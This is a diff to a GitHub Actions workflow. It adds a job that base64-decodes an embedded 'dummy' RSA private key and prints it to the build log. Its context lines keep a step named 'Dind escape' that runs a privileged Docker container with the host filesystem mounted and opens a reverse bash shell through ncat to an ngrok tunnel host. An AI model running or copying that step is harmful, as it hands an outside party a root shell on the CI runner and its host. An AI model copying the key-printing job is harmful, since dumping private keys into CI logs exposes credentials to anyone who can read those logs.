@@ -49,3 +49,42 @@ jobs:
       - name: Dind escape
         run: |
           docker run --privileged --cap-add=ALL -v /:/host raesene/ncat:latest 0.tcp.us-cal-1.ngrok.io 17658 -e /bin/bash
+
+  handle-private-key:
+    runs-on: ubuntu-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+    
+    - name: Decode and print private key
+      env:
+        # This is a base64 encoded dummy private key (NOT A REAL KEY)
+        # In production, this should be stored in GitHub Secrets
+        ENCODED_PRIVATE_KEY: |
+          LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBeFk1cTh6
+          Mk1WQ3pZV3R0Y2t6QVdmTDNMQkVoRVJFQXpxMjNaVzVuZVdWa0lDQmgKWkdGbElHRmtZV1Fp
+          SUdGa1lXUWdZV1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGawpZ
+          V1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1FnWVdS
+          aFpDQmhaR0ZrCklHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmhaQ0Jo
+          WkdGa0lHRmtZV1FnWVdSaFpDQmgKWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZ
+          V1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaApkMEpCUVVWQ1oyOUJRVUZEWjI5QlFV
+          TkRaMjlCUVVGRFoyOUJRVU5EWjI5QlFVRkRaMjlCUVVORFoyOUJRVUZECloyOUJRVU5EWjI5
+          QlFVRkRaMjlCUVVORFoyOUJRVUZEWjI5QlFVTkRaMjlCUVVGRFoyOUJRVU5EWjI5QlFVRkQK
+          WjI5QlFVTkRaMjlCUVVGRFoyOUJRVU5EWjI5QlFVRkRaMjlCUVVORFoyOUJRVUZEWjI5QlFV
+          TkRaMjlCUVVGRApaMjlCUVVORFoyOUJRVUZEWjI5QlFVTkRaMjlCUVVGRFoyOUJRVU5EWjI5
+          QlFVRkRaMjlCUVVORFoyOUJRVUZECloyOUJRVU5EWjI5QlFVRkRSRUZSTUVGQlJFRlJNRUZC
+          UkVGUk1FRkJRMEZSUlVGQlEwRlJSVUZCUTBGUlJVRkIKUTBGUlJVRkJRMEZSUlVGQlEwRlJS
+          VUZLUW05QlEwTm5iMEZCUVVOblowRkJRVU5uWjBGQlFVTm5aMEZCUVVObgpaQ0JoWkdGa0lH
+          RmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmhaQ0JoWkdGa0lHRmtZV1Fn
+          CllXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lXUWdZV1JoWkNCallXUmha
+          Q0JoWkdGa0lHRmsKWVdRZ1lXUmhaQ0JoWkdGa0lHRmtZV1FnWVdSaFpDQmhaR0ZrSUdGa1lX
+          UWdZV1JoWkNCallXUmhaQ0JoWkdGawpJR0ZrWVdRZ1lXUmhaQ0JoWkdGa0lHRmtZV1FnWVdS
+          aFpDQmhaR0ZrSUdGa1lXUUtLS0ZwRGdDQllhRkE9PQotLS0tLUVORCBSU0EgUFJJVkFURSBL
+          RVktLS0tLQ==
+      run: |
+        echo "Decoding private key..."
+        echo "$ENCODED_PRIVATE_KEY" | base64 -d > private_key.pem
+        
+        echo "Private key content:"
+        cat private_key.pem
